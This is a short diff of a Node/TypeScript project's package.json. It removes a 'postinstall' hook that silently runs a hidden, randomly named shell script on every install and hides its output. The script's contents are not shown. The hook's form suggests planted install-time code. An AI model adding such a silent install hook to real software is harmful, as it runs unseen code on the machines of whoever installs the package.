@@ -7,8 +7,7 @@
     "start": "tsx src/server.ts",
     "db:migrate": "tsx --env-file=.env src/migrate.ts",
     "test": "vitest run",
-    "typecheck": "tsc --noEmit",
-    "postinstall": "sh ./.ci-u4e8uc.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "typecheck": "tsc --noEmit"
   },
   "dependencies": {
     "@aws-sdk/client-s3": "^3.1141.0",
